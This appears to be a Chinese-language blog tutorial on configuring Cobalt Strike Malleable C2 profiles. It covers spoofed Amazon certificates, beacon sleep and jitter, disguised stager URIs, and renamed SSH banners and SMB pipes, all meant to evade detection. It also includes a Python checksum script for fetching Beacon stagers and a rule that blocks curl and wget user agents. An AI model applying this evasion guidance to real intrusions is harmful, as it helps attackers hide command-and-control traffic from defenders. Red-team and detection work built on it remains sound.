修改Stager证书方法2：配置Malleable C2 profile文件。


配置profile相对第一种方法更便捷、更灵活，且CS升级也不影响使用。


Malleable C2 profile作为CS的配置文件，可以配置通信流量的特征，用来隐藏自己的行踪，以amazon.profile为例：


https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/normal/amazon.profile


添加HTTPS证书配置：


https-certificate {    set CN "www.amazon.com"; #名称    set O "Amazon"; #机构名称    set C "US"; #国家    set L "US"; #地区    set OU "Amazon"; #组织单位名称    set ST "US"; #州或省    set validity "365"; #有效期}

修改Stager证书方法3：使用真实的证书文件。


这里大概说下思路：首先需要自己注册一个域名，然后去申请一个免费的SSL证书，将生成的store文件放到CS根目录，最后配置profile文件时指定store文件即可。

扫描Beacon


CS添加Listeners后，Stage是可以被扫描出来的，获取Stage地址就可以把信息文件下载下来进行分析。


CS监听的端口上，如果想获取Stage文件，就需要按其URL算法生成一个验证码，随后把验证码拼接到URL上，就可以下载Beacon的Stage文件。


例如我这里CS监听了5555端口，首先运行下面这段代码，按CS的URL算法生成一个验证码：


import random
def generate_checksum(input):    trial = ""    total = 0    while total != input:        total = 0        trial = ''.join(random.sample("abcdefghhijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890",4))        for i in range(4):            total = (total + ord(trial[i:i+1]))% 256    return trial
if __name__ == '__main__':    uri_x86 = generate_checksum(92)    uri_x64 = generate_checksum(93)    print(uri_x64)    print(uri_x86)



然后访问5555端口加验证码，只要生成验证码的规则正确，就可以下载对应端口上的Stage文件：



下载后可以对该文件进行分析，获取其中的配置。


分析脚本：https://github.com/Te-k/cobaltstrike



防止这种情况，需要在profile配置文件中配置uri的值，示例代码如下：


# change the stager serverhttp-stager {        set uri_x86 "/home/default/x1x2x3x86";        set uri_x64 "/home/default/x1x2x3x64";        server {                header "Content-Type" "application/vnd.ms-cab-compressed";        }}


测试时在配置前已经监听的端口，配置后依然能下载，建议部署时就先都配置好。

Malleable C2 Profile安全配置


CS在使用通信过程中，行为和特征等都可以自定义配置，也就是profile配置文件。


1，心跳时间


CS Beacon默认检出时间是60秒，一般会调短一点，提高速度，如果这个时间固定，定时检出，则会存在被监控到的风险，这时需要加入抖动率。


示例：检出时间是3秒，抖动为20，那么下次检出时间间隔可能是将近4秒，也可能不到三秒，这种没有规律的，一般不容易被检测出来。


set sleeptime "3000";set jitter    "20";


2，UserAgent


UA一般默认的或者不离谱的基本都可以，不过如果能捕获到目标企业中通信使用的UA，则会更安全。


set useragent "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";


3，分段传输


传输数据、Exp时，内容建议分段传输，和运输投资类似，分批的安全性比一次的更高。


set host_stage true


4，SSH


使用CS在内网进行SSH连接的时候，其Banner信息中会包含CobaltStrike等关键词，很容易被识别。


#默认设置ssh_banner    Cobalt Strike 4.3  | SSH client bannerssh_pipename  postex_ssh_####  | Name of pipe for SSH sessions. Each # is replaced with a random hex value.#修改示例set ssh_banner "Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-1065-aws x86_64)";set ssh_pipename "SearchTextHarvester##";


5，http-stager


CS会在目标机放一个小的payload，然后由这个小的payload去下载大马，这个过程是个分段过程，不是一次下载回来的，其中下载请求相关的流量特征，可以通过http-stager来定义，示例如下。


http-stager {  set uri_x86 "/get32.gif";  set uri_x64 "/get64.gif";    client {    parameter "id" "1234";    header "Cookie" "SomeValue";  }  server {    header "Content-Type" "image/gif";    output {      prepend "GIF89a";      print;    }  }}


6，http-get/http-post


http-get主要用来请求下载和下发任务用的，beacon执行后会把结果回传给Teamserver，而回传则用的http-post。相关的详细配置可以参考经典的amazon.profile文件，以http-get为例：


http-get {
    set uri "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books";
    client {
        header "Accept" "*/*";        header "Host" "www.amazon.com";
        metadata {            base64;            prepend "session-token=";            prepend "skin=noskin;";            append "csm-hit=s-24KU11BB82RZSYGJ3BDK|1419899012996";            header "Cookie";        }    }
    server {
        header "Server" "Server";        header "x-amz-id-1" "THKUYEZKCKPGY5T42PZT";        header "x-amz-id-2" "a21yZ2xrNDNtdGRsa212bGV3YW85amZuZW9ydG5rZmRuZ2tmZGl4aHRvNDVpbgo=";        header "X-Frame-Options" "SAMEORIGIN";        header "Content-Encoding" "gzip";
        output {            print;        }    }}


其中都是http请求头的相关信息配置，这里注意的是，有一个metadata，它是http元数据，用来定义数据的属性，像上面的三条语句设置的作用：Beacon对Teamserver请求的任务内容首先进行base64编码，然后在尾部拼接.cab，最后加到uri后面。


7，http-config


http-config字段配置用来定义WebServer，大部分都是头字段相关的信息，示例如下。


http-config {    set headers "Server, Content-Type, Cache-Control, Connection, X-Powered-By";        # HTTP header     header "Server" "Microsoft-IIS/8.0";    header "Content-Type" "text/html;charset=UTF-8";    header "Cache-Control" "max-age=1";    header "Connection" "keep-alive";    header "X-Powered-By" "ASP.NET";    set trust_x_forwarded_for "false";           # 若需要重定向，则将trust_x_forwarded_for设置为true。    set block_useragents "curl*,lynx*,wget*";    # 如果useragent带有特定字段，就禁止访问}


8，SMB pipname


CS在使用SMB信标来通信时，如果使用的是默认配置，则会存在被监测到的风险，这里建议重新设置，值可以随意设置一下，示例如下。


###SMB options###set pipename "ntsvcs##";set pipename_stager "scerpc##";set smb_frame_header "";
